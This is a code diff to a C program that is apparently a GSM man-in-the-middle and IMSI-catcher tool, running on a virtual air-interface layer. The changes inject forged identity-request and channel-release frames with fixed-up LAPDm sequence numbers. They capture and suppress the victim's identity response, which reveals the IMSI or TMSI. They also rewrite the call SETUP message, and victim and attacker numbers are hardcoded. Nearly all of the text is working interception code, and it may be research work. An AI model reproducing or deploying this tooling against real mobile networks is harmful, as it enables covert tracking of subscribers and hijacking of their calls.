@@ -68,6 +68,8 @@ struct pending_identity_request {
 	struct map_imsi_tmsi * subscriber;
 	struct chan_desc chan;
 	uint8_t max_count;
+	uint8_t request_lapd_hdr[3];
+	uint8_t response_lapd_hdr[3];
 };
 
 struct pending_setup_intercept {
@@ -90,7 +92,7 @@ static struct pending_identity_request pending_identity_req;
 LLIST_HEAD(subscribers);
 static uint32_t intercept_arfcn = 666;
 
-static char imsi_victim[GSM_EXTENSION_LENGTH + 1] = "2926709347452663";
+static char imsi_victim[GSM_EXTENSION_LENGTH + 1] = "901700000000403";
 static char msisdn_victim[GSM_EXTENSION_LENGTH + 1] = "017519191919";
 static char msisdn_called[GSM_EXTENSION_LENGTH + 1] = "017518181818";
 static char msisdn_attacker[GSM_EXTENSION_LENGTH + 1] = "017517171717";
@@ -220,7 +222,9 @@ static void downlink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 	struct lapdm_msg_ctx mctx;
 	struct lapd_msg_ctx lctx;
 	struct msgb *manip_msg;
+	int dump_msg = 0;
 	int modified = 0;
+	uint8_t nr, ns; // lapdm received nr and sent nr
 
 	// simply forward downlink messages we do not want to intercept
 	if (intercept_arfcn != arfcn) {
@@ -240,7 +244,7 @@ static void downlink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 
 		if (pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx,
 		                  &lctx)) {
-			fprintf(stderr, "Frame number %d: lapd context could not be retrieved...",
+			fprintf(stderr, "Frame number %d: lapd context could not be retrieved...\n",
 			       gh->frame_number);
 			goto push_hdr;
 		}
@@ -248,17 +252,12 @@ static void downlink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 		l3_hdr = msgb_l3(msg);
 		msg->l2h = (unsigned char *) l2_hdr;
 		msg->l1h = (unsigned char *) gh;
-
-		// check if we have an information frame
-		if(!LAPDm_CTRL_is_I(l2_hdr[1])) {
-			goto push_hdr;
-		}
 	}
 
 	switch (mitm_state) {
 	case STATE_IMSI_CATCHER_I_TO_ID_REQ:
-		if(is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
-			manip_msg = msgb_alloc(184 + sizeof(*gh), "id_req");
+		if(LAPDm_CTRL_is_I(l2_hdr[1]) && is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
+			manip_msg = msgb_alloc(184 + (sizeof(*gh) * 8), "id_req");
 			// l1 hdr
 			manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
 			memcpy(manip_msg->l1h, gh, sizeof(*gh));
@@ -266,53 +265,76 @@ static void downlink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 			manip_msg->l2h = msgb_put(manip_msg, 3);
 			memcpy(manip_msg->l2h, l2_hdr, 3);
 			lapdm_set_length((uint8_t *)manip_msg->l2h, 3, 0, 1);
+			memcpy(pending_identity_req.request_lapd_hdr, manip_msg->l2h, 3);
 			// l3 hdr
 			manip_msg->l3h = msgb_put(manip_msg, 3);
 			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = GSM48_PDISC_MM;
 			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = GSM48_MT_MM_ID_REQ;
 			((struct gsm48_hdr *)manip_msg->l3h)->data[0] = pending_identity_req.type;
 
+			// check proto disc and msg type, the values might not be one to one
+			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = gsm48_hdr_pdisc((struct gsm48_hdr *)manip_msg->l3h);
+			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = gsm48_hdr_msg_type((struct gsm48_hdr *)manip_msg->l3h);
+
 			mitm_state = STATE_IMSI_CATCHER_IDENTITY_RESPONSE;
 			log_state_change(STATE_IMSI_CATCHER_I_TO_ID_REQ, STATE_IMSI_CATCHER_IDENTITY_RESPONSE);
+			fprintf(stderr, "-> Modified msg on downlink to identity request!\n");
+			dump_msg = 1;
 			modified = 1;
 		}
 		break;
 	case STATE_IMSI_CATCHER_I_TO_CHAN_REL:
-		if(is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
-			manip_msg = msgb_alloc(184 + sizeof(*gh), "chan_rel");
+		if((LAPDm_CTRL_is_I(l2_hdr[1]) || LAPDm_CTRL_is_U(l2_hdr[1])) && is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
+			manip_msg = msgb_alloc(184 + sizeof(*gh) * 8, "chan_rel");
 			// l1 hdr
 			manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
 			memcpy(manip_msg->l1h, gh, sizeof(*gh));
 			// l2 hdr
 			manip_msg->l2h = msgb_put(manip_msg, 3);
-			memcpy(manip_msg->l2h, l2_hdr, 3);
-			lapdm_set_length((uint8_t *)manip_msg->l2h, 3, 0, 1);
+			// reuse l2 hdr of identity request
+			memcpy(manip_msg->l2h, pending_identity_req.request_lapd_hdr, 3);
+			ns = LAPDm_CTRL_Nr(pending_identity_req.response_lapd_hdr[1]); // set ns to fit with expected nr from ms
+			nr = LAPDm_CTRL_Nr(pending_identity_req.request_lapd_hdr[1]) + 1 ; // increment nr from identity request
+			// prot ident for I Frame i 0
+			// correct the I Frames rec nr and sent nr
+			manip_msg->l2h[1] = LAPDm_CTRL_I(nr, ns, 0);
+
 			// l3 hdr
 			manip_msg->l3h = msgb_put(manip_msg, 3);
 			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = GSM48_PDISC_RR;
 			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = GSM48_MT_RR_CHAN_REL;
 			((struct gsm48_hdr *)manip_msg->l3h)->data[0] = GSM48_RR_CAUSE_NORMAL;
 
+			// check proto disc and msg type, the values might not be one to one
+			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = gsm48_hdr_pdisc((struct gsm48_hdr *)manip_msg->l3h);
+			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = gsm48_hdr_msg_type((struct gsm48_hdr *)manip_msg->l3h);
+
 			mitm_state = STATE_IMSI_CATCHER_SABM;
 			log_state_change(STATE_IMSI_CATCHER_I_TO_CHAN_REL, STATE_IMSI_CATCHER_SABM);
+			fprintf(stderr, "-> Modified msg on downlink to channel release request!\n");
+			dump_msg = 1;
 			modified = 1;
 		}
 		break;
 	case STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD:
 		if(is_channel(&pending_setup_interc.chan, timeslot, subslot, gsmtap_chantype)) {
 			// check if we have a MM msg
-			if(l3_hdr->proto_discr == GSM48_PDISC_MM) {
+			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM) {
 				// of type service accept
-				if(l3_hdr->msg_type == GSM48_MT_MM_CM_SERV_ACC) {
+				if(gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_CM_SERV_ACC) {
 					mitm_state = STATE_INTERCEPT_SETUP;
-					log_state_change(STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, STATE_INTERCEPT_SETUP);
 					pending_setup_interc.frame_delay = 2;
+					log_state_change(STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, STATE_INTERCEPT_SETUP);
+					fprintf(stderr, "-> Found CM service accept! Delay set to %d.\n", pending_setup_interc.frame_delay);
+					dump_msg = 1;
 				}
 				// or ciphering request
-				else if(l3_hdr->msg_type == GSM48_MT_RR_CIPH_M_CMD) {
+				else if(gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_RR_CIPH_M_CMD) {
 					mitm_state = STATE_INTERCEPT_SETUP;
-					log_state_change(STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, STATE_INTERCEPT_SETUP);
 					pending_setup_interc.frame_delay = 3;
+					log_state_change(STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, STATE_INTERCEPT_SETUP);
+					fprintf(stderr, "-> Found RR ciphering mode command! Delay set to %d.\n", pending_setup_interc.frame_delay);
+					dump_msg = 1;
 				}
 			}
 		}
@@ -325,9 +347,11 @@ push_hdr:
 	// push all the bits that have been pulled before so that we have l1 header at data pointer again
 	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);
 
+	if(dump_msg) {
+		fprintf(stderr,"msg dump: %s\n", osmo_hexdump(msgb_data(msg), msgb_length(msg)));
+	}
 	if(modified) {
-		fprintf(stderr,"Modified I frame from: %s\n", osmo_hexdump(msg->data, msg->data_len / 8));
-		fprintf(stderr,"                   to: %s\n", osmo_hexdump(manip_msg->data, manip_msg->data_len / 8));
+		fprintf(stderr,"mod dump: %s\n", osmo_hexdump(msgb_data(manip_msg), msgb_length(manip_msg)));
 		virt_um_write_msg(downlink, manip_msg);
 		msgb_free(msg);
 		return;
@@ -353,6 +377,9 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 	struct lapd_msg_ctx lctx;
 	memset(&mctx, 0, sizeof(mctx));
 	memset(&lctx, 0, sizeof(lctx));
+	struct msgb *manip_msg = NULL;
+	int dump_msg = 0;
+	int modified = 0;
 
 	// simply forward uplink messages we do not want to intercept
 	if ((intercept_arfcn | GSMTAP_ARFCN_F_UPLINK) != arfcn) {
@@ -365,22 +392,23 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 	    gsmtap_chantype == GSMTAP_CHANNEL_TCH_F) {
 
 		msg->l2h = msgb_pull(msg, sizeof(*gh));
-		l2_hdr = msgb_l2(msg);
+		if(mitm_state != STATE_INTERCEPT_SETUP) {
+			l2_hdr = msgb_l2(msg);
 
-		chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
-		chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);
+			chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
+			chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);
 
-		if (pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx,
-		                  &lctx)) {
-			fprintf(stderr, "Frame number %d: lapd context could not be retrieved...",
-			       gh->frame_number);
-			goto push_hdr;
+			if (pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx,
+					  &lctx)) {
+				fprintf(stderr, "Frame number %d: lapd context could not be retrieved...\n",
+				       gh->frame_number);
+				goto push_hdr;
+			}
+
+			l3_hdr = msgb_l3(msg);
+			msg->l2h = (unsigned char *) l2_hdr;
+			msg->l1h = (unsigned char *) gh;
 		}
-
-		l3_hdr = msgb_l3(msg);
-		msg->l2h = (unsigned char *) l2_hdr;
-		msg->l1h = (unsigned char *) gh;
-
 	} else {
 		goto forward_msg;
 	}
@@ -391,8 +419,8 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 		if(LAPDm_CTRL_is_U(l2_hdr[1]) && (lctx.s_u == LAPD_U_SABM || lctx.s_u == LAPD_U_SABME)) {
 
 			// check if we have a MM CM service request
-			if(l3_hdr->proto_discr == GSM48_PDISC_MM &&
-			   l3_hdr->msg_type == GSM48_MT_MM_CM_SERV_REQ) {
+			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
+			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_CM_SERV_REQ) {
 				struct gsm48_service_request *sreq = (struct gsm48_service_request *) l3_hdr->data;
 				struct map_imsi_tmsi *subscriber = get_subscriber(sreq->mi, sreq->mi_len);
 
@@ -405,10 +433,12 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 						mitm_state = STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD;
 						log_state_change(STATE_IMSI_CATCHER_SABM, STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD);
 						fprintf(stderr, "-> Service request - mobile originated call of victim tmsi(%x), imsi(%s)\n", subscriber->tmsi, subscriber->imsi);
+						dump_msg = 1;
 					}
 					break;
 				case SUBSCRIBER_TYPE_MISSING_IMSI:
 					pending_identity_req.subscriber = subscriber;
+					pending_identity_req.type = GSM_MI_TYPE_IMSI;
 					pending_identity_req.max_count = 3;
 					set_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype);
 
@@ -423,15 +453,18 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 				}
 			}
 			// check if we have a MM CM service request
-			if(l3_hdr->proto_discr == GSM48_PDISC_MM &&
-			   l3_hdr->msg_type == GSM48_MT_MM_LOC_UPD_REQUEST) {
+			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
+			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_LOC_UPD_REQUEST) {
 				struct gsm48_loc_upd_req *lureq = (struct gsm48_loc_upd_req *) l3_hdr->data;
 				struct map_imsi_tmsi *subscriber = get_subscriber(lureq->mi, lureq->mi_len);
 
 				switch(check_subscriber(subscriber)) {
 				case SUBSCRIBER_TYPE_MISSING_IMSI:
 					pending_identity_req.subscriber = subscriber;
+					pending_identity_req.type = GSM_MI_TYPE_IMSI;
+					pending_identity_req.max_count = 3;
 					set_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype);
+
 					// start imsi catcher routine
 					mitm_state = STATE_IMSI_CATCHER_I_TO_ID_REQ;
 					log_state_change(STATE_IMSI_CATCHER_SABM, STATE_IMSI_CATCHER_I_TO_ID_REQ);
@@ -450,12 +483,30 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 			// the third message on uplink after ciphering mode command should be the setup message
 			// 1: LAPDM-Receive-Ready, 2: CIPHERING-MODE-COMPLETE, 3: SETUP
 			if(--pending_setup_interc.frame_delay == 0) {
+				// allocate msg for manipulation
+				manip_msg = msgb_alloc(184 + (sizeof(*gh) *8), "mod_setup");
+				// copy gsmtap header to manip msg
+				manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
+				memcpy(manip_msg->l1h, gh, sizeof(*gh));
+				// from l2 the msg is probably enciphered, so we cannot use any info from that layers
+				manip_msg->l2h = msgb_put(manip_msg, msgb_length(msg));
+
 				// encode message as virtual layer does not support encoding right now
 				xcch_encode(PLAIN, msgb_data(msg), encoded_msg, NULL, NULL, NULL);
 				manipulate_setup_message(encoded_msg);
-				xcch_decode(BURSTMAP_XCCH, encoded_msg, NULL, NULL, NULL, msgb_data(msg));
+				xcch_decode(BURSTMAP_XCCH, encoded_msg, NULL, NULL, NULL, manip_msg->l2h);
+
+				// test manip
+				msgb_data(manip_msg)[32] = 0x11;
+				msgb_data(manip_msg)[33] = 0x11;
+				msgb_data(manip_msg)[34] = 0x11;
+
+
 				mitm_state = STATE_IMSI_CATCHER_SABM;
 				log_state_change(STATE_INTERCEPT_SETUP, STATE_IMSI_CATCHER_SABM);
+				fprintf(stderr, "-> Setup Message found and manipulated!\n");
+				dump_msg = 1;
+				modified = 1;
 			}
 		}
 		// do nothing if the incoming msg is not on the synced channel
@@ -467,31 +518,31 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 				log_state_change(STATE_IMSI_CATCHER_IDENTITY_RESPONSE, STATE_IMSI_CATCHER_SABM);
 				fprintf(stderr, "-> No identity response detected...\n");
 			}
-			// check if we have a unnumbered frame of type SABM
-			if(LAPDm_CTRL_is_I(lctx.format)) {
-				struct gsm48_hdr *l3_hdr = msgb_l3(msg);
+			// check if we have a I Frame - MM Identity Response
+			// Note: msg_type is not like msg_type in network standard C99+
+			if(LAPDm_CTRL_is_I(l2_hdr[1]) &&
+			   gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
+			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_ID_RESP) {
+				uint8_t mi_len = l3_hdr->data[0]; // mobile identity length
+				uint8_t* mi = &l3_hdr->data[1]; // mobile identity
+				char mi_string[GSM48_MI_SIZE];
+				uint8_t type = mi[0] & GSM_MI_TYPE_MASK;
+				gsm48_mi_to_string(mi_string, sizeof(mi_string), mi, mi_len);
+				memcpy(pending_identity_req.response_lapd_hdr, l2_hdr, 3);
 
-				// check if we have a MM Identity Response
-				if(l3_hdr->proto_discr == GSM48_PDISC_MM &&
-				   l3_hdr->msg_type == GSM48_MT_MM_ID_RESP) {
-					uint8_t mi_len = l3_hdr->data[0]; // mobile identity length
-					uint8_t* mi = &l3_hdr->data[1]; // mobile identity
-					char* mi_string = NULL;
-					uint8_t type = mi[0] & GSM_MI_TYPE_MASK;
-					gsm48_mi_to_string(mi_string, sizeof(mi_string), mi, mi_len);
-
-					// if we got a response to our identity request, we do not want to forward it
-					if(pending_identity_req.type == GSM_MI_TYPE_TMSI && type == GSM_MI_TYPE_TMSI) {
-						pending_identity_req.subscriber->tmsi = tmsi_from_string(mi_string);
-						mitm_state = STATE_IMSI_CATCHER_I_TO_CHAN_REL;
-						log_state_change(STATE_IMSI_CATCHER_IDENTITY_RESPONSE, STATE_IMSI_CATCHER_I_TO_CHAN_REL);
-						goto free_msg;
-					} else if(pending_identity_req.type == GSM_MI_TYPE_IMSI && type == GSM_MI_TYPE_IMSI) {
-						strcpy(pending_identity_req.subscriber->imsi, mi_string);
-						mitm_state = STATE_IMSI_CATCHER_I_TO_CHAN_REL;
-						log_state_change(STATE_IMSI_CATCHER_IDENTITY_RESPONSE, STATE_IMSI_CATCHER_I_TO_CHAN_REL);
-						goto free_msg;
-					}
+				// if we got a response to our identity request, we do not want to forward it
+				if(pending_identity_req.type == GSM_MI_TYPE_TMSI && type == GSM_MI_TYPE_TMSI) {
+					pending_identity_req.subscriber->tmsi = tmsi_from_string(mi_string);
+					mitm_state = STATE_IMSI_CATCHER_I_TO_CHAN_REL;
+					log_state_change(STATE_IMSI_CATCHER_IDENTITY_RESPONSE, STATE_IMSI_CATCHER_I_TO_CHAN_REL);
+					fprintf(stderr, "-> Catched and blocked identity response - tmsi!\n");
+					goto free_msg;
+				} else if(pending_identity_req.type == GSM_MI_TYPE_IMSI && type == GSM_MI_TYPE_IMSI) {
+					strcpy(pending_identity_req.subscriber->imsi, mi_string);
+					mitm_state = STATE_IMSI_CATCHER_I_TO_CHAN_REL;
+					log_state_change(STATE_IMSI_CATCHER_IDENTITY_RESPONSE, STATE_IMSI_CATCHER_I_TO_CHAN_REL);
+					fprintf(stderr, "-> Catched and blocked identity response - imsi!\n");
+					goto free_msg;
 				}
 			}
 		}
@@ -503,26 +554,22 @@ push_hdr:
 	// push all the bits that have been pulled before so that we have l1 header at data pointer again
 	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);
 
+	if(dump_msg) {
+		fprintf(stderr, "msg dump: %s\n", osmo_hexdump(msgb_data(msg), msgb_length(msg)));
+	}
+	if(modified) {
+		fprintf(stderr,"mod dump: %s\n", osmo_hexdump(msgb_data(manip_msg), msgb_length(manip_msg)));
+		virt_um_write_msg(downlink, manip_msg);
+		msgb_free(msg);
+		return;
+	}
+
 	// Forward msg to uplink
 forward_msg:
 	virt_um_write_msg(uplink, msg);
 	return;
 free_msg:
 	msgb_free(msg);
-}
-
-/*
- * Just forward to test connection e.g.
- */
-static void uplink_rcv_cb_simple_forward(struct virt_um_inst *vui, struct msgb *msg) {
-	virt_um_write_msg(uplink, msg);
-}
-
-/*
- * Just forward to test connection e.g.
- */
-static void downlink_rcv_cb_simple_forward(struct virt_um_inst *vui, struct msgb *msg) {
-	virt_um_write_msg(downlink, msg);
 }
 
 int main(int argc, char **argv)
